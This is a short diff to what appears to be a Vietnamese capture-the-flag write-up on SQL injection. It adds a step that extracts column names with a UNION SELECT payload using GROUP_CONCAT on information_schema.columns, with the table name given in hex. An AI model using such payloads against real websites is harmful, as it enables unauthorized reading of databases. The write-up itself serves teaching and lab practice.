@@ -37,3 +37,9 @@ Breed:
 Color: w0w_y0u_f0und_m3
 webeight
 ```
+## Trích xuất columns
+Trích xuất tables rồi đến trích xuất columns, vẫn sử dụng function group_concat():
+
+**-1 union all select null,null,GROUP_CONCAT(column_name SEPARATOR 0x3c62723e),null from information_schema.columns WHERE TABLE_NAME=0x7730775f7930755f6630756e645f6d33--**
+
+**0x7730775f7930755f6630756e645f6d33 thực chất là dạng hex của string "w0w_y0u_f0und_m3"**
